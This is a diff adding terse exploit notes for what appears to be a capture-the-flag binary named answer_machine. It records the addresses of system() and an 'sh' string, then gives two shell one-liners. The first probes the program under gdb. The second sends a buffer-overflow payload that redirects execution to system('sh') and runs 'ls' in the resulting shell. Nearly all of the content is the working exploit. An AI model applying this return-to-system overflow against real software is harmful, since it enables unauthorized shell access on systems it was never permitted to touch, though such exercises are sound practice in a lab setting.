@@ -1,0 +1,12 @@
+0x08048490
+system()
+
+0x080485f3
+call system()
+
+0x8048798=Error opening
+0x80487c0="sh\n"
+
+{ sleep 1; echo "r"; sleep 1; echo "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH@@@@@@@@@@@@@@@@####"; sleep 1; } | gdb /problems/answer_machine/answer_machine
+
+{ sleep 1; echo -e "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH@@@@@@@@@@@@@@@@\xf3\x85\x04\x08\xc0\x87\x04\x08"; sleep 1; echo "ls"; } | ./answer_machine
